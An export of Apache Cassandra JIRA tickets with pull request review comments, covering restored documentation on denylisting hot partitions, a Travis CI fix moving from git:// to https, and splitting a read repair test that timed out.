<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,sharan,jwest,jwest,12/Apr/22 17:58,17/Jan/23 09:56,13/Jul/23 08:40,17/Jan/23 08:29,NA,,,,,,Documentation/Website,,,,0,,The documentation added in https://issues.apache.org/jira/browse/CASSANDRA-12106 went missing when the documents were migrated to the new format. We just need to bring the doc back. Along with this fix there are a couple minor edits to make to the document itself to correct the examples. ,,jmckenzie,jwest,sharan,smiklosovic,,,,,,,,,,,"sharanf opened a new pull request, #2028:
URL: https://github.com/apache/cassandra/pull/2028

   Documentation from Partition Denylist Lost in Document Migration + Minor Fixes
   (https://issues.apache.org/jira/browse/CASSANDRA-17547[)]
   
   - Recover and add denylist documentation
   
   
   
   


;27/Nov/22 13:39;githubbot;600","josh-mckenzie commented on code in PR #2028:
URL: https://github.com/apache/cassandra/pull/2028#discussion_r1033032244


##########
doc/modules/cassandra/pages/operating/denylisting_partitions.adoc:
##########
@@ -0,0 +1,141 @@
+= Denylisting Partitions
+
+Due to access patterns and data modeling, sometimes there are specific partitions
+that are ""hot"" and can cause instability in a Cassandra cluster. This often occurs
+when your data model includes many update or insert operations on a single partition,
+causing the partition to grow very large over time and in turn making it very expensive
+to read and maintain.
+
+Cassandra supports ""denylisting"" these problematic partitions so that when clients
+issue point reads (`SELECT` statements with the partition key specified) or range
+reads (`SELECT *`, etc that pull a range of data) that intersect with a blocked
+partition key, the query will be immediately rejected with an `InvalidQueryException`.
+
+== How to denylist a partition key
+
+The ``system_distributed.denylisted_partitions`` table can be used to denylist partitions.
+There are a couple of ways to interact with and mutate this data. First: directly
+via CQL by inserting a record with the following details:
+
+- Keyspace name (ks_name)
+- Table name (table_name)
+- Partition Key (partition_key)
+
+The partition key format needs to be in the same form required by ``nodetool getendpoints``.
+
+Following are several examples for denylisting partition keys in keyspace `ks` and
+table `table1` for different data types on the primary key `Id`:
+
+ - Id is a simple type - INSERT INTO system_distributed.denylisted_partitions (ks_name, table_name, partition_key) VALUES ('ks','table1','1');
+ - Id is a blob        - INSERT INTO system_distributed.denylisted_partitions (ks_name, table_name, partition_key) VALUES ('ks','table1','12345f');
+ - Id has a colon      - INSERT INTO system_distributed.denylisted_partitions (ks_name, table_name, partition_key) VALUES ('ks','table1','1\:2');
+
+In the case of composite column partition keys (Key1, Key2):
+
+ - INSERT INTO system_distributed.denylisted_partitions (ks_name, table_name, partition_key) VALUES ('ks', 'table1', 'k11:k21')
+
+
+ === Special considerations

Review Comment:
   The leading whitespace on this section is leading to things being formatted incorrectly (at least in intellij preview; assuming that will hold true for generated pages?)



;27/Nov/22 23:46;githubbot;600","sharanf commented on PR #2028:
URL: https://github.com/apache/cassandra/pull/2028#issuecomment-1328934582

   > Little leading whitespace trouble but once tidied up looks good.
   
   Thanks for the feedback @josh-mckenzie . Have removed the ones I found - so hope this clears them


;28/Nov/22 11:39;githubbot;600","smiklosovic closed pull request #2028: CASSANDRA-17547
URL: https://github.com/apache/cassandra/pull/2028


;17/Jan/23 08:32;githubbot;600","smiklosovic closed pull request #2101: CASSANDRA-17547 Add documentation for partition denylisting
URL: https://github.com/apache/cassandra/pull/2101


;17/Jan/23 09:56;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,3000,,,0,3000,,,,,,,,,,,,,,,CASSANDRA-16761,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,sharan,,,,,,,,,,,,,,Documentation,,,,,,,,Low Hanging Fruit,Code Inspection,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Jan 16 14:49:03 UTC 2023,,,,,,,All,,,,"0|z11eiw:",9223372036854775807,,,,jmckenzie,smiklosovic,,,Normal,,NA,,https://github.com/apache/cassandra/commit/0b47c57184cebeac54f5858571b880bcb90917c6,,,,,,,,,Stage locally for verification,,,,,"15/Apr/22 16:46;jmckenzie;ping [~polandll] - if this was actually caused by the move in CASSANDRA-16763 (new docs added during review cycle and missed maybe?), we should probably invest a little time in diffing a snapshot of the documentation on the commit before 16763 [and it|https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=05b0eaecad5e40390352a4e182179a29ac784372] to make sure nothing else was inadvertently dropped.

And [~jwest] - we linked CASSANDRA-16761 here; was it that or the doc move that we think this got caught up in?;;;","15/Apr/22 16:58;jwest;I may have linked the wrong ticket. I thought that was the parent one for all new doc stuff and I assume this got caught up in the doc move (per the cassandra-dev thread it was expected to a degree);;;","23/Oct/22 10:31;sharan;[~jwest] - are you still active on this ticket? If not then please let me know as I'd be happy to pick it up. Thanks;;;","06/Nov/22 17:53;sharan;Hi [~jwest] I'll pick this up. Feel free to ping me with any if any info if necessary. Thanks!;;;","12/Nov/22 17:20;jmckenzie;Happy to keep review on this one [~sharan]; just let me know how I can assist.;;;","27/Nov/22 13:41;sharan;Hi [~jmckenzie]. Please can you take a look at [https://github.com/apache/cassandra/pull/2028] and let me have any feedback.;;;","27/Nov/22 23:47;jmckenzie;Review feedback left on PR. A little whitespace trouble leading to some bad formatting (at least in intellij previewer) but once resolved LGTM.;;;","28/Nov/22 19:26;jmckenzie;+1;;;","16/Jan/23 14:49;smiklosovic;+1. 

I ve fixed minor typos / very cosmetic improvements here (1) - this is what I am going to merge.

https://github.com/apache/cassandra/pull/2101

I tested it by buildin the documentation / website locally and it rendered it just fine.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix Travis CI for Python DTests,CASSANDRA-17545,13439051,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,11/Apr/22 22:39,12/Apr/22 22:14,13/Jul/23 08:40,12/Apr/22 22:14,,,,,,,CI,,,,0,,"Seems like in the past month Travis CI is failing with the following issue:

 
{code:java}
fatal: remote error: 
  The unauthenticated git protocol on port 9418 is no longer supported.
Please see https://github.blog/2021-09-01-improving-git-protocol-security-github/ for more information.
{code}
 ",,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Apr 12 22:14:41 UTC 2022,,,,,,,All,,,,"0|z11d88:",9223372036854775807,,,,brandon.williams,,,,Low,,,,https://github.com/apache/cassandra-dtest/commit/029e1903cfed2e710b366cba5360f443db2139d0,,,,,,,,,"This is an issue we fixed for CircleCI long time ago, not sure why it popped out only now. The fix is simple, move from git:// to [https://.|https:///]

I pushed a patch [here|https://github.com/apache/cassandra-dtest/pull/183].  Seems like Travis CI starts a build only on commit. I tested locally the issue is fixed:

 
{code:java}
e$ git remote add apache-https https://github.com/apache/cassandra-dtest.git
e$ git fetch apache-https
From https://github.com/apache/cassandra-dtest{code}",,,,,"11/Apr/22 22:42;e.dimitrova;This is an issue we fixed for CircleCI long time ago, not sure why it popped out only now. The fix is simple, move from git:// to [https://.|https:///]

I pushed a patch [here| https://github.com/apache/cassandra-dtest/pull/183].  Seems like Travis CI starts a build only on commit. I tested locally the issue is fixed:

 
{code:java}
e$ git remote add apache-https https://github.com/apache/cassandra-dtest.git
e$ git fetch apache-https
From https://github.com/apache/cassandra-dtest
{code}
 ;;;","12/Apr/22 22:04;brandon.williams;+1;;;","12/Apr/22 22:14;e.dimitrova;Committed, thanks;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ReadRepairQueryTypesTest.testUnrestrictedQueryOnSkinnyTable[8: strategy=NONE coordinator=1 flush=false paging=false] times out sporadically,CASSANDRA-17543,13439006,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,adelapena,maedhroz,maedhroz,11/Apr/22 16:45,27/May/22 19:24,13/Jul/23 08:40,22/Apr/22 16:34,4.0.4,4.1,4.1-alpha1,,,,Test/dtest/java,,,,0,,"org.apache.cassandra.distributed.test.ReadRepairQueryTypesTest.testUnrestrictedQueryOnSkinnyTable[8: strategy=NONE coordinator=1 flush=false paging=false]

{noformat}
Error Message
Timeout occurred. Please note the time in the report does not reflect the time until the timeout.
Stacktrace
junit.framework.AssertionFailedError: Timeout occurred. Please note the time in the report does not reflect the time until the timeout.
	at jdk.internal.reflect.GeneratedMethodAccessor4.invoke(Unknown Source)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/java.util.Vector.forEach(Vector.java:1388)
	at jdk.internal.reflect.GeneratedMethodAccessor4.invoke(Unknown Source)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at jdk.internal.reflect.GeneratedMethodAccessor4.invoke(Unknown Source)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/java.util.Vector.forEach(Vector.java:1388)
	at jdk.internal.reflect.GeneratedMethodAccessor4.invoke(Unknown Source)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/java.util.Vector.forEach(Vector.java:1388)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at org.apache.cassandra.anttasks.TestHelper.execute(TestHelper.java:53)
	at jdk.internal.reflect.GeneratedMethodAccessor4.invoke(Unknown Source)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/java.util.Vector.forEach(Vector.java:1388)
	at jdk.internal.reflect.GeneratedMethodAccessor4.invoke(Unknown Source)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at jdk.internal.reflect.GeneratedMethodAccessor4.invoke(Unknown Source)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
{noformat}

See https://ci-cassandra.apache.org/job/Cassandra-trunk/1075/testReport/org.apache.cassandra.distributed.test/ReadRepairQueryTypesTest/testUnrestrictedQueryOnSkinnyTable_8__strategy_NONE_coordinator_1_flush_false_paging_false_/",,adelapena,maedhroz,,,,,,,,,,,,,"maedhroz commented on code in PR #1568:
URL: https://github.com/apache/cassandra/pull/1568#discussion_r849664513


##########
test/distributed/org/apache/cassandra/distributed/test/ReadRepairCollectionQueriesTest.java:
##########
@@ -0,0 +1,239 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test;
+
+import org.junit.Test;
+import org.junit.runner.RunWith;
+import org.junit.runners.Parameterized;
+
+import static org.apache.cassandra.distributed.shared.AssertUtils.row;
+
+/**
+ * {@link ReadRepairQueryTester} for queries on collections.
+ */
+@RunWith(Parameterized.class)

Review Comment:
   nit: Do the subclasses need `@RunWith(Parameterized.class)`?



;13/Apr/22 16:13;githubbot;600","maedhroz commented on code in PR #1568:
URL: https://github.com/apache/cassandra/pull/1568#discussion_r849665015


##########
test/distributed/org/apache/cassandra/distributed/test/ReadRepairQueryTester.java:
##########
@@ -0,0 +1,280 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test;
+
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.Collection;
+import java.util.List;
+
+import org.junit.AfterClass;
+import org.junit.BeforeClass;
+import org.junit.runner.RunWith;
+import org.junit.runners.Parameterized;
+
+import org.apache.cassandra.distributed.Cluster;
+import org.apache.cassandra.service.reads.repair.ReadRepairStrategy;
+
+import static java.util.concurrent.TimeUnit.MINUTES;
+import static org.apache.cassandra.distributed.shared.AssertUtils.assertEquals;
+import static org.apache.cassandra.distributed.shared.AssertUtils.assertRows;
+import static org.apache.cassandra.service.reads.repair.ReadRepairStrategy.NONE;
+
+/**
+ * Tests basic read repair functionality with different types of query types and schemas.
+ * <p>
+ * Each test verifies that its tested query triggers read repair propagating mismatched rows/columns and row/column
+ * deletions. They also verify that the selected rows and columns are propagated through read repair on missmatch,
+ * and that unselected rows/columns are not repaired.
+ * <p>
+ * The tests are parameterized for:
+ * <ul>
+ *     <li><Both {@code NONE} and {@code BLOCKING} read repair stratregies/li>
+ *     <li>Data to be repaired residing on the query coordinator or a replica</li>
+ *     <li>Data to be repaired residing on memtables or flushed to sstables</li>
+ * </ul>
+ * <p>
+ * All the included tests have a similar behaviour:
+ * <ul>
+ *     <li>Create a keyspace with RF=2 and a table</li>
+ *     <li>Insert some data in only one of the nodes</li>
+ *     <li>Run the tested read query selecting a subset of the inserted columns with CL=ALL</li>
+ *     <li>Verify that the previous read has triggered read repair propagating only the queried columns</li>
+ *     <li>Run the tested read query again but this time selecting all the columns</li>
+ *     <li>Verify that the previous read has triggered read repair propagating the rest of the queried rows</li>
+ *     <li>Delete one of the involved columns in just one node</li>
+ *     <li>Run the tested read query again but this time selecting a column different to the deleted one</li>
+ *     <li>Verify that the previous read hasn't propagated the column deletion</li>
+ *     <li>Run the tested read query again selecting all the columns</li>
+ *     <li>Verify that the previous read has triggered read repair propagating the column deletion</li>
+ *     <li>Delete one of the involved rows in just one node</li>
+ *     <li>Run the tested read query again selecting all the columns</li>
+ *     <li>Verify that the previous read has triggered read repair propagating the row deletions</li>
+ *     <li>Verify the final status of each node and drop the table</li>
+ * </ul>
+ */
+@RunWith(Parameterized.class)
+public abstract class ReadRepairQueryTester extends TestBaseImpl

Review Comment:
   naming nit: `ReadRepairQueryTester` -> `ReadRepairQueryTest`



;13/Apr/22 16:14;githubbot;600","maedhroz commented on code in PR #1568:
URL: https://github.com/apache/cassandra/pull/1568#discussion_r849665887


##########
test/distributed/org/apache/cassandra/distributed/test/ReadRepairQueryTester.java:
##########
@@ -0,0 +1,280 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test;
+
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.Collection;
+import java.util.List;
+
+import org.junit.AfterClass;
+import org.junit.BeforeClass;
+import org.junit.runner.RunWith;
+import org.junit.runners.Parameterized;
+
+import org.apache.cassandra.distributed.Cluster;
+import org.apache.cassandra.service.reads.repair.ReadRepairStrategy;
+
+import static java.util.concurrent.TimeUnit.MINUTES;
+import static org.apache.cassandra.distributed.shared.AssertUtils.assertEquals;
+import static org.apache.cassandra.distributed.shared.AssertUtils.assertRows;
+import static org.apache.cassandra.service.reads.repair.ReadRepairStrategy.NONE;
+
+/**
+ * Tests basic read repair functionality with different types of query types and schemas.

Review Comment:
   ```suggestion
    * Base class for tests around read repair functionality with different query types and schemas.
   ```



;13/Apr/22 16:15;githubbot;600","maedhroz commented on code in PR #1568:
URL: https://github.com/apache/cassandra/pull/1568#discussion_r849666774


##########
test/distributed/org/apache/cassandra/distributed/test/ReadRepairQueryTester.java:
##########
@@ -0,0 +1,280 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test;
+
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.Collection;
+import java.util.List;
+
+import org.junit.AfterClass;
+import org.junit.BeforeClass;
+import org.junit.runner.RunWith;
+import org.junit.runners.Parameterized;
+
+import org.apache.cassandra.distributed.Cluster;
+import org.apache.cassandra.service.reads.repair.ReadRepairStrategy;
+
+import static java.util.concurrent.TimeUnit.MINUTES;
+import static org.apache.cassandra.distributed.shared.AssertUtils.assertEquals;
+import static org.apache.cassandra.distributed.shared.AssertUtils.assertRows;
+import static org.apache.cassandra.service.reads.repair.ReadRepairStrategy.NONE;
+
+/**
+ * Tests basic read repair functionality with different types of query types and schemas.
+ * <p>
+ * Each test verifies that its tested query triggers read repair propagating mismatched rows/columns and row/column
+ * deletions. They also verify that the selected rows and columns are propagated through read repair on missmatch,
+ * and that unselected rows/columns are not repaired.
+ * <p>
+ * The tests are parameterized for:
+ * <ul>
+ *     <li><Both {@code NONE} and {@code BLOCKING} read repair stratregies/li>
+ *     <li>Data to be repaired residing on the query coordinator or a replica</li>
+ *     <li>Data to be repaired residing on memtables or flushed to sstables</li>
+ * </ul>
+ * <p>
+ * All the included tests have a similar behaviour:

Review Comment:
   ```suggestion
    * All derived tests follow the same pattern:
   ```



;13/Apr/22 16:16;githubbot;600","maedhroz commented on code in PR #1568:
URL: https://github.com/apache/cassandra/pull/1568#discussion_r849666774


##########
test/distributed/org/apache/cassandra/distributed/test/ReadRepairQueryTester.java:
##########
@@ -0,0 +1,280 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test;
+
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.Collection;
+import java.util.List;
+
+import org.junit.AfterClass;
+import org.junit.BeforeClass;
+import org.junit.runner.RunWith;
+import org.junit.runners.Parameterized;
+
+import org.apache.cassandra.distributed.Cluster;
+import org.apache.cassandra.service.reads.repair.ReadRepairStrategy;
+
+import static java.util.concurrent.TimeUnit.MINUTES;
+import static org.apache.cassandra.distributed.shared.AssertUtils.assertEquals;
+import static org.apache.cassandra.distributed.shared.AssertUtils.assertRows;
+import static org.apache.cassandra.service.reads.repair.ReadRepairStrategy.NONE;
+
+/**
+ * Tests basic read repair functionality with different types of query types and schemas.
+ * <p>
+ * Each test verifies that its tested query triggers read repair propagating mismatched rows/columns and row/column
+ * deletions. They also verify that the selected rows and columns are propagated through read repair on missmatch,
+ * and that unselected rows/columns are not repaired.
+ * <p>
+ * The tests are parameterized for:
+ * <ul>
+ *     <li><Both {@code NONE} and {@code BLOCKING} read repair stratregies/li>
+ *     <li>Data to be repaired residing on the query coordinator or a replica</li>
+ *     <li>Data to be repaired residing on memtables or flushed to sstables</li>
+ * </ul>
+ * <p>
+ * All the included tests have a similar behaviour:

Review Comment:
   ```suggestion
    * All derived tests follow a similar pattern:
   ```



;13/Apr/22 16:16;githubbot;600","adelapena commented on code in PR #1568:
URL: https://github.com/apache/cassandra/pull/1568#discussion_r849844169


##########
test/distributed/org/apache/cassandra/distributed/test/ReadRepairCollectionQueriesTest.java:
##########
@@ -0,0 +1,239 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test;
+
+import org.junit.Test;
+import org.junit.runner.RunWith;
+import org.junit.runners.Parameterized;
+
+import static org.apache.cassandra.distributed.shared.AssertUtils.row;
+
+/**
+ * {@link ReadRepairQueryTester} for queries on collections.
+ */
+@RunWith(Parameterized.class)

Review Comment:
   Not really, removed from subclasses.



;13/Apr/22 19:57;githubbot;600","adelapena commented on code in PR #1568:
URL: https://github.com/apache/cassandra/pull/1568#discussion_r850256072


##########
test/distributed/org/apache/cassandra/distributed/test/ReadRepairQueryTester.java:
##########
@@ -0,0 +1,280 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test;
+
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.Collection;
+import java.util.List;
+
+import org.junit.AfterClass;
+import org.junit.BeforeClass;
+import org.junit.runner.RunWith;
+import org.junit.runners.Parameterized;
+
+import org.apache.cassandra.distributed.Cluster;
+import org.apache.cassandra.service.reads.repair.ReadRepairStrategy;
+
+import static java.util.concurrent.TimeUnit.MINUTES;
+import static org.apache.cassandra.distributed.shared.AssertUtils.assertEquals;
+import static org.apache.cassandra.distributed.shared.AssertUtils.assertRows;
+import static org.apache.cassandra.service.reads.repair.ReadRepairStrategy.NONE;
+
+/**
+ * Tests basic read repair functionality with different types of query types and schemas.
+ * <p>
+ * Each test verifies that its tested query triggers read repair propagating mismatched rows/columns and row/column
+ * deletions. They also verify that the selected rows and columns are propagated through read repair on missmatch,
+ * and that unselected rows/columns are not repaired.
+ * <p>
+ * The tests are parameterized for:
+ * <ul>
+ *     <li><Both {@code NONE} and {@code BLOCKING} read repair stratregies/li>
+ *     <li>Data to be repaired residing on the query coordinator or a replica</li>
+ *     <li>Data to be repaired residing on memtables or flushed to sstables</li>
+ * </ul>
+ * <p>
+ * All the included tests have a similar behaviour:
+ * <ul>
+ *     <li>Create a keyspace with RF=2 and a table</li>
+ *     <li>Insert some data in only one of the nodes</li>
+ *     <li>Run the tested read query selecting a subset of the inserted columns with CL=ALL</li>
+ *     <li>Verify that the previous read has triggered read repair propagating only the queried columns</li>
+ *     <li>Run the tested read query again but this time selecting all the columns</li>
+ *     <li>Verify that the previous read has triggered read repair propagating the rest of the queried rows</li>
+ *     <li>Delete one of the involved columns in just one node</li>
+ *     <li>Run the tested read query again but this time selecting a column different to the deleted one</li>
+ *     <li>Verify that the previous read hasn't propagated the column deletion</li>
+ *     <li>Run the tested read query again selecting all the columns</li>
+ *     <li>Verify that the previous read has triggered read repair propagating the column deletion</li>
+ *     <li>Delete one of the involved rows in just one node</li>
+ *     <li>Run the tested read query again selecting all the columns</li>
+ *     <li>Verify that the previous read has triggered read repair propagating the row deletions</li>
+ *     <li>Verify the final status of each node and drop the table</li>
+ * </ul>
+ */
+@RunWith(Parameterized.class)
+public abstract class ReadRepairQueryTester extends TestBaseImpl

Review Comment:
   `ReadRepairQueryTest` produces [an initialization error](https://app.circleci.com/pipelines/github/adelapena/cassandra/1482/workflows/877e7dd4-6e46-4610-aa3b-5a67cc7b2a9d/jobs/15338), I'm keeping `ReadRepairQueryTester` which is in line with other abstract test classes without tests such as `CQLTester`.



;14/Apr/22 09:22;githubbot;600","adelapena closed pull request #1568: CASSANDRA-17543 4.0: Split ReadRepairQueryTypesTest to avoid JUnit timeouts
URL: https://github.com/apache/cassandra/pull/1568


;22/Apr/22 16:34;githubbot;600","adelapena closed pull request #1569: CASSANDRA-17543 trunk: Split ReadRepairQueryTypesTest to avoid JUnit timeouts
URL: https://github.com/apache/cassandra/pull/1569


;22/Apr/22 16:34;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,5400,,,0,5400,,,,,,,,,,,,,,,CASSANDRA-15977,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,adelapena,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Apr 22 16:32:12 UTC 2022,,,,,,,All,,,,"0|z11cy8:",9223372036854775807,,,,maedhroz,,,,Normal,,4.0.0,,https://github.com/apache/cassandra/commit/2873c9126979e21a8089e9a18d96af802745dbc2,,,,,,,,,Test fix,,,,,"11/Apr/22 17:54;maedhroz;Possibly relevant conversation: https://issues.apache.org/jira/browse/CASSANDRA-15977?focusedCommentId=17214813&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-17214813;;;","12/Apr/22 12:21;adelapena;The {{ReadRepairQueryTypesTest}} test suite seems very stable on CircleCI, as it's shown by the success of these 1000-iteration runs:
||branch||CI||
|4.0|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1471/workflows/c183b8ac-4a34-4774-865e-4fe85f3aa191] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1471/workflows/d5fd42da-098f-4752-8810-d1063a504850]|
|trunk|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1470/workflows/843f5ceb-f0f8-4b81-8a5d-61e333118ca6] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1470/workflows/21f52bdc-9a1e-4eab-8ae2-e99721d24e57]|

However, it seems that a particularly slow run on Jenkins can hit the config limit defined by [{{test.distributed.timeout}}|https://github.com/apache/cassandra/blob/2fde9af74f12179fd8b3d592adc9a24d8b2d8f23/build.xml#L116]. The reported run times for the the last Jenkins runs show great variability, with some runs being close to the limit:
||mm:ss||
|[09:26|https://ci-cassandra.apache.org/job/Cassandra-trunk/1074/testReport/org.apache.cassandra.distributed.test/ReadRepairQueryTypesTest/]|
